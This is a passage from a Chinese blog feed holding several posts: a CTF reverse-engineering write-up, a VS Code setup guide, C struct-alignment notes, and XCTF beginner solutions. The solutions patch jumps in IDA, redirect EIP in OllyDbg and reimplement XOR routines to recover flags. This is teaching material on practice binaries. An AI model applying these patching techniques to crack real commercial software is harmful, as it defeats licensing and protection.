alt="-w917"><br>但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。</p><h3 id="OD动态分析"><a href="#OD动态分析" class="headerlink" title="OD动态分析"></a>OD动态分析</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>这就是一个地址。然后我们输入123测试<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>已经穿进eax。<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了<code>mlk</code>。<br>查看下对应的ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>可以明显发现处理前的字符与处理后的字符相加都等于158</strong>。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre></div><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%是VC编译的字符串结束标志不用代入。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vscode的简单调教</title>
    <link href="/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <url>/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Vscode的简单调教"><a href="#Vscode的简单调教" class="headerlink" title="Vscode的简单调教"></a>Vscode的简单调教</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。</p><h2 id="正常设置"><a href="#正常设置" class="headerlink" title="正常设置"></a>正常设置</h2><p><img src="/2019/11/15/Vs code的简单调教/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>在这里点击完设置以后，会出现：<br><img src="/2019/11/15/Vs code的简单调教/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。</p><h2 id="配置编译环境"><a href="#配置编译环境" class="headerlink" title="配置编译环境"></a>配置编译环境</h2><p>这里我只用到c/c++和Python就只记录这个了。<br><img src="/2019/11/15/Vs code的简单调教/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>输入C/C++<br><img src="/2019/11/15/Vs code的简单调教/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>在这里进行点个install。<br>PYthon也是同样的操作。</p><h2 id="让代码跑起来"><a href="#让代码跑起来" class="headerlink" title="让代码跑起来"></a>让代码跑起来</h2><p>在应用商店里搜索<strong>Code Runner</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>这个是个神器，有了它就可以在vscode直接运行各种代码。<br>安装好后把vscode关闭，然后重新打开。</p><h3 id="新建个C-C-文件："><a href="#新建个C-C-文件：" class="headerlink" title="新建个C/C++文件："></a>新建个C/C++文件：</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>然后右键<br><img src="/2019/11/15/Vs code的简单调教/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>是可以运行代码的。<br>在右上角：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>这个小三角也可以运行代码。看下效果：<br><img src="/2019/11/15/Vs code的简单调教/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="更改为终端输出"><a href="#更改为终端输出" class="headerlink" title="更改为终端输出"></a>更改为终端输出</h3><p>我们改一下代码：<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(“%d”,&amp;a);<br>        printf(“hello world!”);<br><br>    }</iostream></p><p>在这样直接运行后发现：<img src="/2019/11/15/Vs code的简单调教/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>卡在运行过程且我们无法输入：<br><img src="/2019/11/15/Vs code的简单调教/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>这个解决办法就是<strong>更改为终端输出就可以了</strong>。<br><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>点击配置扩展信息。下滑找到：<br><img src="/2019/11/15/Vs code的简单调教/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>然后打个勾就可以了。<br>运行：<br><img src="/2019/11/15/Vs code的简单调教/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>发现成功了，然后看下其原理就是帮你对终端进行了<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，<strong>且支持语法错误的检测，</strong>然后就想着去改下让其用clang++来编译。</p><h3 id="自定义运行逻辑"><a href="#自定义运行逻辑" class="headerlink" title="自定义运行逻辑"></a>自定义运行逻辑</h3><p><img src="/2019/11/15/Vs code的简单调教/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>还是进入这个配置里面：<br><img src="/2019/11/15/Vs code的简单调教/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>在settings.json中编辑:</p><div class="hljs"><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre></div><h4 id="成品："><a href="#成品：" class="headerlink" title="成品："></a>成品：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>直接粘贴这段代码放入这里面保存就可以了。</p><h4 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h4><p><img src="/2019/11/15/Vs code的简单调教/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>实现我们的目的了。</p><h3 id="测试一下Python"><a href="#测试一下Python" class="headerlink" title="测试一下Python"></a>测试一下Python</h3><p>这是直接新建的：<br><img src="/2019/11/15/Vs code的简单调教/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs code的简单调教/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。</p>]]></content>
    
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（五）</title>
    <link href="/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（五）"><a href="#C语言与反汇编学习（五）" class="headerlink" title="C语言与反汇编学习（五）"></a>C语言与反汇编学习（五）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。<strong>集中于结构体部分以及结构体对齐的知识。</strong></p><h2 id="结构体的使用练习"><a href="#结构体的使用练习" class="headerlink" title="结构体的使用练习"></a>结构体的使用练习</h2><p>1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息    。<br>要求：<br>    (1) 具体包含哪些信息自由设计<br>    (2) 但这些包含的类型中，必须要有一个成员是结构体类型。<br>    2、定义一个函数，用来给这个结构体变量赋值.<br>3、定义一个函数，用来显示这个结构体变量的所有成员信息.<br>    #include <iostream><br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    struct point<br>    {<br>        int x;<br>        int y;<br>        int z;<br>    };<br>    struct Gamer<br>    {<br>        char name[20];<br>        int level;<br>        float HP;<br>        point a;<br>    }No1;<br>    void Function()<br>    {<br>        char a[]=”xiaozhi”;<br>        for (int i = 0; i &lt;strlen(a) ; ++i) {<br>            No1.name[i]=a[i];<br>        }<br>        No1.level = 99;<br>        No1.HP = 99.9;<br>        No1.a.x=6;<br>        No1.a.y=5;<br>        No1.a.z=9;<br>    }<br>    void Display()<br>    {<br>        printf(“name:%s level:%d HP:%f point:%d %d %d “,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);<br>    }<br>    int main() {<br>        Function();<br>        Display();<br>        return 0;<br>    }</iostream></p><h2 id="sizeof的使用"><a href="#sizeof的使用" class="headerlink" title="sizeof的使用"></a>sizeof的使用</h2><h3 id="基本类型的sizeof"><a href="#基本类型的sizeof" class="headerlink" title="基本类型的sizeof"></a>基本类型的sizeof</h3><p>可以使用类型，也可以使用变量<br>例子：</p><p>printf(“%d\n”,sizeof(char));<br>printf(“%d\n”,sizeof(int));<br>printf(“%d\n”,sizeof(float));<br>printf(“%d\n”,sizeof(double));</p><p>int x = 10;            //变量<br>printf(“%d\n”,sizeof(x));        </p><h3 id="数组类型的sizeof"><a href="#数组类型的sizeof" class="headerlink" title="数组类型的sizeof"></a>数组类型的sizeof</h3><p>例子：<br>    char arr1[10] = {0};<br>    short arr2[10] = {0};<br>    int arr3[10] = {0};                </p><div class="hljs"><pre><code>printf(&quot;%d\n&quot;,sizeof(arr1));                //10printf(&quot;%d\n&quot;,sizeof(arr2));            //    20printf(&quot;%d\n&quot;,sizeof(arr3));            //    40printf(&quot;%d\n&quot;,sizeof(arr1[10]));            //    1printf(&quot;%d\n&quot;,sizeof(arr2[10]));            //    2printf(&quot;%d\n&quot;,sizeof(arr3[10]));                //4</code></pre></div><p>注意其中的不同。</p><h2 id="结构体（内存）对齐"><a href="#结构体（内存）对齐" class="headerlink" title="结构体（内存）对齐"></a>结构体（内存）对齐</h2><h3 id="为什么要有内存对齐？"><a href="#为什么要有内存对齐？" class="headerlink" title="为什么要有内存对齐？"></a>为什么要有内存对齐？</h3><p>本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。</p><h3 id="pragma-pack的基本用法"><a href="#pragma-pack的基本用法" class="headerlink" title="pragma pack的基本用法"></a>pragma pack的基本用法</h3><p>在vc6.0++中默认值是8字节对齐。</p><div class="hljs"><pre><code>#pragma pack( n )结构体。#pragma pack(  )</code></pre></div><p>该操作会改变一个结构体的字节对齐数，这是针对编译器的。<br>对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。<br>如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，<strong>即是说，结构体成员的偏移量应该取二者的最小值.</strong></p><div class="hljs"><pre><code>#pragma pack(n)            struct Test            {                 int a ;                 __int64 b ;                 char c ;            };            #pragma pack()            </code></pre></div><p>以下是各种情况的内存对齐分析:<br>1:1字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626712023.jpg" srcset="/img/loading.gif" alt="-w155"><br>2:2字节对齐时：<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735626990588.jpg" srcset="/img/loading.gif" alt="-w266"><br>3：4个字节对齐<br><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627321430.jpg" srcset="/img/loading.gif" alt="-w381"><br>4、8个字节对齐</p><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735627463362.jpg" srcset="/img/loading.gif" alt="-w583"></p><h3 id="对齐原则："><a href="#对齐原则：" class="headerlink" title="对齐原则："></a>对齐原则：</h3><p>原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储).                                    </p><p>原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。<br>原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。                                    <strong>(struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.)</strong>                                    </p><p>原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.<br>    也就是说，结构体成员的偏移量应该取二者的最小值.                                </p><p><strong>由浅入深，分析内存对齐原则后内存到底是怎么分配的</strong></p><h4 id="案例分析一："><a href="#案例分析一：" class="headerlink" title="案例分析一："></a>案例分析一：</h4><div class="hljs"><pre><code>struct Test                {                    char  a;                    int b ;                };                </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735632219948.jpg" srcset="/img/loading.gif" alt="-w671"><br><strong>sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数)</strong></p><h4 id="案例二分析："><a href="#案例二分析：" class="headerlink" title="案例二分析："></a>案例二分析：</h4><div class="hljs"><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                    };                    </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735634186981.jpg" srcset="/img/loading.gif" alt="-w621"><br><strong>sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例三分析："><a href="#案例三分析：" class="headerlink" title="案例三分析："></a>案例三分析：</h4><div class="hljs"><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                        char d ;                    };                    </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735635119907.jpg" srcset="/img/loading.gif" alt="-w662"></p><p><strong>sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数)</strong></p><h4 id="案例四分析："><a href="#案例四分析：" class="headerlink" title="案例四分析："></a>案例四分析：</h4><div class="hljs"><pre><code>struct S1        {            char c;        double i;    };        </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636051365.jpg" srcset="/img/loading.gif" alt="-w530"></p><p><strong>sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数)</strong></p><h4 id="案例五分析："><a href="#案例五分析：" class="headerlink" title="案例五分析："></a>案例五分析：</h4><div class="hljs"><pre><code>struct S2        {            int c1;         char c2[10]; };    </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735636961393.jpg" srcset="/img/loading.gif" alt="-w547"></p><p><strong>sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数)</strong></p><h4 id="案例六分析："><a href="#案例六分析：" class="headerlink" title="案例六分析："></a>案例六分析：</h4><div class="hljs"><pre><code>struct S3        {            char c1;         S1 s;            char c2;         char c3;     };</code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735637638057.jpg" srcset="/img/loading.gif" alt="-w539"></p><p><strong>sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数)</strong></p><h4 id="案例七分析："><a href="#案例七分析：" class="headerlink" title="案例七分析："></a>案例七分析：</h4><div class="hljs"><pre><code>struct S4        {            char c1;         S1 s;            char c2;         double c3;     };    </code></pre></div><p><img src="/2019/11/12/C语言与反汇编学习（五）/images/15735639114324.jpg" srcset="/img/loading.gif" alt="-w558"></p><p><strong>sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xctf\_RE新手区WP</title>
    <link href="/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <url>/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Xctf-RE新手区WP"><a href="#Xctf-RE新手区WP" class="headerlink" title="Xctf_RE新手区WP"></a>Xctf_RE新手区WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>第一步，先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15732702605654.jpg" srcset="/img/loading.gif" alt="-w625"><br>（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733071101333.jpg" srcset="/img/loading.gif" alt="-w656"><br>看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。<strong>估计就是个明文对比</strong>，直接od打开：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733074111357.jpg" srcset="/img/loading.gif" alt="-w911"><br>断在了re模块。直接搜索字符串<img src="/2019/11/09/Xctfre_新手区wp/images/15733075097915.jpg" srcset="/img/loading.gif" alt="-w673"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733072667813.jpg" srcset="/img/loading.gif" alt="-w801"><br>拿到flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>还是先查壳：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733077161080.jpg" srcset="/img/loading.gif" alt="-w519"><br>无壳<br>这道题有多种做法，下面展示三种：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079095740.jpg" srcset="/img/loading.gif" alt="-w678"><br>先看下程序是做什么的：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079517175.jpg" srcset="/img/loading.gif" alt="-w545"><br>先输入个1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733079675395.jpg" srcset="/img/loading.gif" alt="-w507"><br>发现图案中第1，2，8行图形发生了变化。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733082372049.jpg" srcset="/img/loading.gif" alt="-w659"><br>接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733085847753.jpg" srcset="/img/loading.gif" alt="-w607"></p><h4 id="打开IDA进行静态分析"><a href="#打开IDA进行静态分析" class="headerlink" title="打开IDA进行静态分析"></a>打开IDA进行静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733087052533.jpg" srcset="/img/loading.gif" alt="-w489"><br>发现一堆函数难以找到主函数，按<code>shift+F12</code>查看字符串<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088311433.jpg" srcset="/img/loading.gif" alt="-w909"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733088160599.jpg" srcset="/img/loading.gif" alt="-w865"><br>点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733091045568.jpg" srcset="/img/loading.gif" alt="-w746"></p><p>跳转好后按F5查看伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733092783647.jpg" srcset="/img/loading.gif" alt="-w471"><br>在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094560784.jpg" srcset="/img/loading.gif" alt="-w465"><br>发现会出现这个字符串，然后：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733094810614.jpg" srcset="/img/loading.gif" alt="-w387"><br>还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。<strong>那就是想办法让程序调用<code>sub_45Ab4</code>这个函数就可以了。</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733096364506.jpg" srcset="/img/loading.gif" alt="-w307"><br>再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。</p><p>那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733100087904.jpg" srcset="/img/loading.gif" alt="-w423"><br>看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733100975029.jpg" srcset="/img/loading.gif" alt="-w394"><br>这几处的汇编代码进行patch：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733101571151.jpg" srcset="/img/loading.gif" alt="-w504"><br><strong>把JNZ改成正好相反的JZ</strong><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107484458.jpg" srcset="/img/loading.gif" alt="-w460"></p><p>修改好后查看下生成的伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733107946575.jpg" srcset="/img/loading.gif" alt="-w375"><br>达到了我们想要的结果。<br>然后我们需要把这些打patch的地方保存下来，让其成效：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733103617647.jpg" srcset="/img/loading.gif" alt="-w1324"><br>点击ok即可，可以为了安全选择一下做个bak备份。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733108996551.jpg" srcset="/img/loading.gif" alt="-w564"><br>输入1<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733109139764.jpg" srcset="/img/loading.gif" alt="-w661"><br>拿到了flag。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。</p><h4 id="IDA寻找输出flag函数的函数地址"><a href="#IDA寻找输出flag函数的函数地址" class="headerlink" title="IDA寻找输出flag函数的函数地址"></a>IDA寻找输出flag函数的函数地址</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733116649387.jpg" srcset="/img/loading.gif" alt="-w829"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733116800264.jpg" srcset="/img/loading.gif" alt="-w702"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733118131519.jpg" srcset="/img/loading.gif" alt="-w688"><br>记住这个0045E940 地址。下面OD直接想办法执行到该地址</p><h4 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733122639383.jpg" srcset="/img/loading.gif" alt="-w498"><br>发现基地址是010F<br>在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124212188.jpg" srcset="/img/loading.gif" alt="-w692"><br>发现了输入n的语句地址。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733124483702.jpg" srcset="/img/loading.gif" alt="-w695"><br>设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码<code>jmp 0x010FE490</code><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733126763356.jpg" srcset="/img/loading.gif" alt="-w688"></p><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733126850272.jpg" srcset="/img/loading.gif" alt="-w205"><br>这时候的EIP，然后单步执行<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127939834.jpg" srcset="/img/loading.gif" alt="-w869"><br>过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733127636852.jpg" srcset="/img/loading.gif" alt="-w674"></p><p>这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以<br>在找到一个可以控制代码后，在搜索字符串中找到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733133763253.jpg" srcset="/img/loading.gif" alt="-w637"><br>单击过去，然后在这个函数的开头设置为新的EIP<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733132918043.jpg" srcset="/img/loading.gif" alt="-w622"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733134257814.jpg" srcset="/img/loading.gif" alt="-w208"><br>然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。</p><h4 id="OD静态分析"><a href="#OD静态分析" class="headerlink" title="OD静态分析"></a>OD静态分析</h4><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733137173061.jpg" srcset="/img/loading.gif" alt="-w682"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137433462.jpg" srcset="/img/loading.gif" alt="-w521"><br>调用其函数。双击进入F5生成伪代码：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733137975116.jpg" srcset="/img/loading.gif" alt="-w555"><br>（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。</p><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;string.h&gt;int main() {        int i;        char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0};        char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0};        for ( i = 0; i &lt; 56; ++i )        {            arr1[i] ^= arr2[i];            arr1[i] ^= 0x13u;        }        printf(&quot;%s&quot;,arr1);    return 0;}</code></pre></div><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733139966832.jpg" srcset="/img/loading.gif" alt="-w734"><br>运行就拿到了flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的<br>肯定是进行了某种加密。</p><h3 id="先查壳"><a href="#先查壳" class="headerlink" title="先查壳"></a>先查壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733878960896.jpg" srcset="/img/loading.gif" alt="-w544"><br>无壳，32位c++程序</p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733879199369.jpg" srcset="/img/loading.gif" alt="-w431"><br>输入正确的serial，会提示正确。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733881777919.jpg" srcset="/img/loading.gif" alt="-w602"><br>进入main函数，F5大法查看伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733882559724.jpg" 